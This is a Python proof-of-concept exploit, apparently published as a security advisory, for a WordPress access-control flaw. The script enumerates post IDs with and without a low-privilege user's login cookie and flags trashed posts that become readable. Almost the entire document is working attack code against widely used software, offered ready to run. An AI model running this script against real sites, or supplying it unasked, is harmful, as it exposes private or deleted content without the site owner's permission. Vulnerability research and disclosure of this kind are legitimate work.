#/usr/bin/python
#
# WordPress > 2.9 Failure to Restrict URL Access PoC
#
# This script iterates through the WP post ID's as an authenticated and unauthenticated user.
# If the requests differ a 'Trash' post has been found.
#
# You will need an authenticated user cookie of any priveledge to run this script.
#
# Example cookie:
# wordpress_logged_in_62b3ab14f277d92d3d313662ea0c84e3=test%7C1266245173%7C990157a59700a69edbf133aa22fca1f8
#
# Will only work with WP URLs with the '/?p={int}' parameter. Would need to handle redirects (3xx) to handle all URL types.
#
#
# Research/PoC/Advisory By: Tom Mackenzie (tmacuk) and Ryan Dewhurst (ethicalhack3r)

import httplib

# Declare vars
blogURL = "www.example.com"
userCookie = "enter_cookie_here"
postID = 0 #Leave at 0

conn = httplib.HTTPConnection(blogURL)
Headers = {"Cookie" : userCookie}

print
print "Target = http://" + blogURL + "/?p=" + str(postID)
print

while 1:

 # Start non authenticated enumeration

 request = '/?p=' + str(postID)
 conn.request("GET", request, "")

 try:
  r1 = conn.getresponse()
 except:
  print "Connection error"

 data1 = r1.read()

 # Start authenticated enumeration

 conn.request("GET", request, None, Headers)

 try:
  r2 = conn.getresponse()
 except:
  print "Connection error"

 data2 = r2.read()

 # Compare the HTML body reponses

 if data1 != data2:
  print "+ Found! http://" + blogURL + request
 else:
  print request

 postID += 1

conn.close()
